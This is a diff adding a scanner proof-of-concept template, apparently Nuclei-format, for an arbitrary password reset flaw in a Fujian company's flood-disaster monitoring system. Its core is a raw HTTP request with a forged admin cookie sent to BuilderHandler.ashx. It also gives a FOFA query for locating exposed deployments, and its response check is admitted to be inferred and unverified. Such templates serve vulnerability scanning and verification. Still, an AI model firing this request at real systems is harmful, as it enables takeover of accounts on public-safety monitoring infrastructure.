@@ -1,0 +1,34 @@
+id: poc-vcydg1yxoxxeg059
+info:
+  name: 福建四创软件有限公司山洪灾害监测系统BuilderHandler存在用户任意密码重置
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vcydg1yxoxxeg059
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vcydg1yxoxxeg059
+    fofa: title="山洪灾害监测预警" && body="福建四创软件有限公司"
+http:
+- raw:
+  - 'GET /CommonReport/AjaxHandler/BuilderHandler.ashx?OPType=Search&r=0.01189784453040943 HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/56.0.1199.24 Safari/537.36
+
+    Cookie: UserName=admin; IsRememberUser=1; username=admin; RealName=admin;
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+
+    AddSearchField=1&DEPARTID=&TCID=24&PageSize=20'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
